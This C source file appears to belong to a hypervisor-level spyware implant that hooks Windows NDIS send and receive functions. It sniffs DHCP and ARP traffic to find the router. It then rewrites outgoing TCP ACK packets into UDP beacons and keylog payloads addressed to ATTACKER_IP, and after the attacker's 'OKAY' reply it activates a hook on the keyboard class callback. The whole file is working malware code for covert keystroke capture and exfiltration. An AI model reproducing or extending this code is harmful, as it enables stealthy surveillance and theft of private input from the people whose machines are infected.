#include <hooks/ndis.h>
#include <vmm/vmcs.h>
#include <vmm/vmm.h>
#include <lib/instr.h>
#include <hooks/hooking.h>
#include <lib/util.h>
#include <network/ethernet.h>
#include <network/ip.h>
#include <network/udp.h>
#include <network/dhcp.h>
#include <network/arp.h>
#include <network/tcp.h>

__attribute__((section(".vmm"))) 
BOOL parse_net_buffer_list(uint64_t PNetBufferLists, uint64_t *PNetBuffer, uint64_t *PMdl){
    
    if (*(uint64_t*)guest_virtual_to_physical(NET_BUFFER_LIST_Next(PNetBufferLists)) != 0) return FALSE;
    *PNetBuffer = *(uint64_t*)guest_virtual_to_physical(NET_BUFFER_LIST_FirstNetBuffer(PNetBufferLists));
    if (*(uint64_t*)guest_virtual_to_physical(NET_BUFFER_Next(*PNetBuffer)) != 0) return FALSE;
    *PMdl = *(uint64_t*)guest_virtual_to_physical(NET_BUFFER_CurrentMdl(*PNetBuffer));
    if (*(uint64_t*)guest_virtual_to_physical(MDL_Next(*PMdl)) != 0) return FALSE;
    return TRUE;

}

__attribute__((section(".vmm"))) 
void parse_pkt_metadata(uint64_t PNetBuffer, uint64_t PMdl, uint64_t *pkt_pfn, uint32_t *byte_offset, uint32_t *data_offset, uint32_t *data_length){
    
    *pkt_pfn = *(uint64_t*)guest_virtual_to_physical(MDL_PhysicalPage(PMdl));
    *byte_offset = *(uint32_t*)guest_virtual_to_physical(MDL_ByteOffset(PMdl));
    *data_offset = *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_DataOffset(PNetBuffer));
    *data_length = *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_DataLength(PNetBuffer));

}

__attribute__((section(".vmm"))) 
BOOL is_tcp_ack_pkt(byte_t *physical_pkt_addr){
    
    ethernet_t *eth_hdr = physical_pkt_addr;
    if (eth_hdr->type != FLIP_WORD(ETHERNET_TYPE_IP)) return FALSE;
    ip_t *ip_hdr = eth_hdr->payload;
    if (ip_hdr->protocol != IPV4_PROTOCOL_TCP) return FALSE;
    tcp_t *tcp_hdr = ip_hdr->payload;
    if (tcp_hdr->flags.value != TCP_ACK_ONLY) return FALSE;
    return TRUE;

}

__attribute__((section(".vmm"))) 
void change_pkt_metadata(uint64_t PNetBuffer, uint32_t data_offset, uint32_t data_length, uint32_t total_packet_size){

    *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_DataOffset(PNetBuffer)) = data_offset+data_length-total_packet_size;       // Must be at the top of the MDL
    *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_CurrentMdlOffset(PNetBuffer)) = data_offset+data_length-total_packet_size; // Must be at the top of the MDL
    *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_DataLength(PNetBuffer)) = total_packet_size;

}

__attribute__((section(".vmm"))) 
void change_pkt_checksum_settings(uint64_t PNetBufferLists){
    
    NDIS_TCP_IP_CHECKSUM_NET_BUFFER_LIST_INFO *tcpip_info = guest_virtual_to_physical(NET_BUFFER_LIST_INFO(PNetBufferLists, NDIS_NET_BUFFER_LIST_INFO_TcpIpChecksumNetBufferListInfo));
    tcpip_info->Transmit.IsIPv6 = 0;
    tcpip_info->Transmit.IsIPv4 = 1;
    tcpip_info->Transmit.TcpChecksum = 0;
    tcpip_info->Transmit.TcpHeaderOffset = 0;
    tcpip_info->Transmit.IpHeaderChecksum = 1;
    tcpip_info->Transmit.UdpChecksum = 1;

}

__attribute__((section(".vmm"))) 
void build_spyware_packet(byte_t *pkt){

    ethernet_t *eth_hdr = pkt;
    ip_t *ip_hdr = eth_hdr->payload;
    udp_t *udp_hdr = ip_hdr->payload;
    build_ethernet(pkt, shared_cores_data.router_mac, "IP");
    build_ip(ip_hdr, sizeof(udp_t)+1+shared_cores_data.spyware_data_buffer.length, ATTACKER_IP);
    *(uint8_t*)(udp_hdr->payload) = shared_cores_data.spyware_data_buffer.length;
    memcpy(udp_hdr->payload+1, shared_cores_data.spyware_data_buffer.chars, shared_cores_data.spyware_data_buffer.length);
    build_udp(udp_hdr, SRC_PORT, DST_KEYLOGS_PORT, ip_hdr, 1+shared_cores_data.spyware_data_buffer.length);

}

__attribute__((section(".vmm"))) 
void build_scan_packet(byte_t *pkt){

    ethernet_t *eth_hdr = pkt;
    ip_t *ip_hdr = eth_hdr->payload;
    udp_t *udp_hdr = ip_hdr->payload;
    build_ethernet(pkt, shared_cores_data.router_mac, "IP");
    build_ip(ip_hdr, sizeof(udp_t)+7, ATTACKER_IP);
    memcpy(udp_hdr->payload, "PLEASE", 7);
    build_udp(udp_hdr, SRC_PORT, DST_SCAN_PORT, ip_hdr, 7);

}

__attribute__((section(".vmm")))
void check_dhcp_ack(byte_t *pkt){

    ethernet_t *eth_hdr = pkt;
    if (eth_hdr->type != FLIP_WORD(ETHERNET_TYPE_IP)) return;

    ip_t *ip_hdr = eth_hdr->payload;
    if (ip_hdr->protocol != IPV4_PROTOCOL_UDP) return;
    
    udp_t *udp_hdr = ip_hdr->payload;
    if (udp_hdr->destination != FLIP_WORD(68)) return;
    // DHCP

    dhcp_t *dhcp = udp_hdr->payload;
    if (dhcp->op != DHCP_OP_REPLY || *(uint8_t*)(find_dhcp_option(dhcp, DHCP_CODE_MESSAGE_TYPE)->data) != DHCP_MESSAGE_TYPE_ACK) return;

    shared_cores_data.router_ip = FLIP_DWORD(*(uint32_t*)(((dhcp_option_t*)find_dhcp_option(dhcp, DHCP_CODE_SERVER_ID))->data));
    LOG_INFO("Found router IP: %d.%d.%d.%d\n",
                (shared_cores_data.router_ip & 0xff000000)>>24,
                (shared_cores_data.router_ip & 0xff0000)>>16,
                (shared_cores_data.router_ip & 0xff00)>>8,
                 shared_cores_data.router_ip & 0xff);

}

__attribute__((section(".vmm")))
void check_router_arp(byte_t *pkt){
    ethernet_t *eth_hdr = pkt;
    if (eth_hdr->type != FLIP_WORD(ETHERNET_TYPE_ARP)) return;
    
    arp_t *arp = eth_hdr->payload;
    if (arp->operation != FLIP_WORD(ARP_OP_RESPONSE)) return;
    
    if (FLIP_DWORD(arp->sender_prot) != shared_cores_data.router_ip) return;

    memcpy(shared_cores_data.router_mac, arp->sender_hw, 6);
    LOG_INFO("Found router MAC: %x:%x:%x:%x:%x:%x\n",
                shared_cores_data.router_mac[0],
                shared_cores_data.router_mac[1],
                shared_cores_data.router_mac[2],
                shared_cores_data.router_mac[3],
                shared_cores_data.router_mac[4],
                shared_cores_data.router_mac[5],
                shared_cores_data.router_mac[6]);
    shared_cores_data.mac_ready = TRUE;

    // Activate sending
    shared_cores_data.send_requests = TRUE;
    hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);

}

__attribute__((section(".vmm")))
void check_if_attacker_msg(byte_t *pkt){

    ethernet_t *eth_hdr = pkt;

    if (eth_hdr->type != FLIP_WORD(ETHERNET_TYPE_IP)) return;

    ip_t *ip_hdr = eth_hdr->payload;
    if (ip_hdr->protocol != IPV4_PROTOCOL_UDP) return;
    
    udp_t *udp_hdr = ip_hdr->payload;
    if (udp_hdr->destination != FLIP_WORD(SRC_PORT)) return;

    byte_t *payload = udp_hdr->payload;
    if (memcmp(payload, "OKAY", 5)){
        shared_cores_data.send_requests = FALSE;

        // Activate keyboard hook
        hook_function(guest_virtual_to_physical(shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET), &shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_x, shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_rw);
        
        // remove the receive hook
        *(uint16_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET) = PUSH_R12;
    }
    // else if (memcmp(payload, "NOPE", 5)){
    //     // Activate sending for scan
    //     // shared_cores_data.send_requests = TRUE;
    //     // hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
    // }

}

__attribute__((section(".vmm"))) 
void handle_ndisMSendNBLToMiniportInternal_hook(vmexit_data_t *state){

    // Emulate PUSH RBP
    __vmwrite(GUEST_RSP, __vmread(GUEST_RSP)-8);
    uint64_t guest_stack = __vmread(GUEST_RSP);
    uint64_t guest_stack_phys = guest_virtual_to_physical(guest_stack);
    *(uint64_t*)guest_stack_phys = state->registers->rbp;

    if (!shared_cores_data.mac_ready) return;

    uint64_t PNetBufferLists = state->registers->rdx, PNetBuffer, PMdl;
    if (!parse_net_buffer_list(PNetBufferLists, &PNetBuffer, &PMdl)) return;

    uint64_t pkt_pfn;
    uint32_t byte_offset, data_offset, data_length;
    parse_pkt_metadata(PNetBuffer, PMdl, &pkt_pfn, &byte_offset, &data_offset, &data_length);

    byte_t *physical_pkt_addr  = pkt_pfn*PAGE_SIZE + byte_offset + data_offset;

    if (!is_tcp_ack_pkt(physical_pkt_addr)) return;
    
    // If sending a request packet
    if (shared_cores_data.send_requests){

        uint32_t total_packet_size = sizeof(ethernet_t)+sizeof(ip_t)+sizeof(udp_t)+7;
        if (data_length + data_offset < total_packet_size){
            // packet not big enough for some reason.
            return;
        }

        // Change the offset & length accordingly
        change_pkt_metadata(PNetBuffer, data_offset, data_length, total_packet_size);
        
        // Tell the NIC to calculate IP and UDP checksums
        change_pkt_checksum_settings(PNetBufferLists);

        // Build the packet
        byte_t *new_pkt = pkt_pfn*PAGE_SIZE + byte_offset + (data_offset+data_length-total_packet_size);
        memset(new_pkt, 0, total_packet_size);
        build_scan_packet(new_pkt);

        pin_based_ctls_t pin_based_ctls = {0};
        pin_based_ctls.value = __vmread(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS);
        if (!pin_based_ctls.activate_vmx_preemption_timer){
            pin_based_ctls.activate_vmx_preemption_timer = TRUE;
            __vmwrite(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS, pin_based_ctls.value);
            __vmwrite(GUEST_VMX_PREEMPTION_TIMER, 0x2ffffff);
        }
        *(byte_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET) = PUSH_RBP;

        return;

    }

    // Acquire the lock
    AcquireLock(&shared_cores_data.spyware_data_lock);
    if (!shared_cores_data.send_pending){       
        // this means that another core has already sent the data before we acquired the lock.
        ReleaseLock(&shared_cores_data.spyware_data_lock);
        return;
    }

    // Verify that packet size is enough
    uint32_t total_packet_size = sizeof(ethernet_t)+sizeof(ip_t)+sizeof(udp_t)+1+shared_cores_data.spyware_data_buffer.length;
    if (data_length + data_offset < total_packet_size){
        // packet not big enough for some reason.
        ReleaseLock(&shared_cores_data.spyware_data_lock);
        return;
    }

    // Change the offset & length accordingly
    change_pkt_metadata(PNetBuffer, data_offset, data_length, total_packet_size);
    
    // Tell the NIC to calculate IP and UDP checksums
    change_pkt_checksum_settings(PNetBufferLists);

    // Build the packet
    byte_t *new_pkt = pkt_pfn*PAGE_SIZE + byte_offset + (data_offset+data_length-total_packet_size);
    memset(new_pkt, 0, total_packet_size);
    build_spyware_packet(new_pkt);
    
    shared_cores_data.spyware_data_buffer.length = 0;

    // remove the hook and release the lock
    shared_cores_data.send_pending = FALSE;
    *(byte_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET) = PUSH_RBP;
    ReleaseLock(&shared_cores_data.spyware_data_lock);

}

__attribute__((section(".vmm"))) 
void handle_NdisMIndicateReceiveNetBufferLists_hook(vmexit_data_t *state){

    // Emulate PUSH R12
    __vmwrite(GUEST_RSP, __vmread(GUEST_RSP)-8);
    uint64_t guest_stack = __vmread(GUEST_RSP);
    uint64_t guest_stack_phys = guest_virtual_to_physical(guest_stack);
    *(uint64_t*)guest_stack_phys = state->registers->r12;

    uint64_t PNetBufferLists = state->registers->rdx, PNetBuffer, PMdl;
    if (!parse_net_buffer_list(PNetBufferLists, &PNetBuffer, &PMdl)) return;

    uint64_t pkt_pfn;
    uint32_t byte_offset, data_offset, data_length;
    parse_pkt_metadata(PNetBuffer, PMdl, &pkt_pfn, &byte_offset, &data_offset, &data_length);

    byte_t *physical_pkt_addr  = pkt_pfn*PAGE_SIZE + byte_offset + data_offset;
    
    if (shared_cores_data.router_ip == 0){
        check_dhcp_ack(physical_pkt_addr);
    }

    else if (!shared_cores_data.mac_ready){
        check_router_arp(physical_pkt_addr);
    }

    else if (shared_cores_data.mac_ready){
        check_if_attacker_msg(physical_pkt_addr);
    }
}
